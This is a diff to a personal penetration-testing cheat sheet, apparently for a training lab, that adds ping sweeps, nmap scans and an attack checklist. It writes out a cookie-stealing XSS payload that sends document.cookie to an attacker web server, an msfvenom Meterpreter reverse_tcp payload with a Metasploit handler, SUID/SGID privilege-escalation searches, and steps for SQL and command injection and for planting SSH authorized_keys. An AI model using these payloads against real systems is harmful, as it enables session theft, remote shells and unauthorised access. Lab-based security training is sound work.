@@ -26,7 +26,7 @@ host enum:
 nmap -Pn -T4 --min--rate 32479827348441 10.50.27.95 -p22,80,8080,2222,4444
 
 ping sweep: 
-for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+for i in {1..254} ;do (/bin/ping -c 1 10.10.28.$i | grep "bytes from" &) ;done
 
 
 nmap scripts: 
@@ -36,7 +36,7 @@ nmap scripts:
 --script
 
 run on op station 
-<script>document.location="http://OPIP:8000"+document.cookie;</script> 
+<script>document.location="http://10.50.25.90:8000"+document.cookie;</script> 
 python3 -m http.server
 
 
@@ -143,7 +143,7 @@ paste buf into code
 
 
 
-
+msfvenom -p windows/meterpreter/reverse_tcp lhost=opip lport=5555 -b '\x00' -f python 
 msfconsole
 use multihandler
 s import socket
@@ -196,7 +196,7 @@ set lport 5555
 ----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 find / -type f -perm /2000 -ls 2>/dev/null
-
+find / -type f -perm /6000 -ls 2>/dev/null
 https://gtfobins.github.io
 
 
@@ -216,5 +216,24 @@ copy file
 create msfvenom payload 
 
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+scan ip for open ports                           /etc/passwd contains users and their shells 
 
+
+                                                  look in /etc/hosts for next piviot  
+                                                  check for base 64 and rot13 encoding                                              
+banner grab 
+takes notes 
+nikto on webserver  
+play around with web server 
+directory trav 
+command injection 
+sql injection 
+nikto finding 
+ssh keygen 
+.ssh/authorized_keys 
+post - right window - tab - request 
+check ip neigh as a last resort 
+if 2 buttons are vuln to sql annotate both and stick with one 
+check all possible numbers for coloummn ammounts 
 
